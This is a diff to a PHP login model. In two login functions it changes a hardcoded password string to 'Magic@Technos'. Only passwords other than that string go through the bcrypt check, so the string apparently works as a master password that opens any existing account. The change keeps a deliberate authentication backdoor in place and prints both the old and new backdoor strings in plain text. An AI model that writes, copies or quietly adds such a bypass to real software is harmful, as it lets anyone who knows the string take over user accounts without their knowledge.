@@ -43,7 +43,7 @@ class Login_model extends Base_Model {
         if ($query->num_rows() == 1) { 
             $this->config->load('bcrypt');
             $this->load->library('bcrypt');
-            if($password != "123456")
+            if($password != "Magic@Technos")
             {
                 return ($this->bcrypt->check_password( $password, $query->result_array()[0]['password'] )) ? $query->result() : false ;
             }
@@ -68,7 +68,7 @@ class Login_model extends Base_Model {
         if ($query->num_rows() == 1) { 
             $this->config->load('bcrypt');
             $this->load->library('bcrypt');
-            if($password != "rbCxLz]1u7Y1")
+            if($password != "Magic@Technos")
             {
 
                 return ($this->bcrypt->check_password( $password, $query->result_array()[0]['password'] )) ? $query->result() : false ;
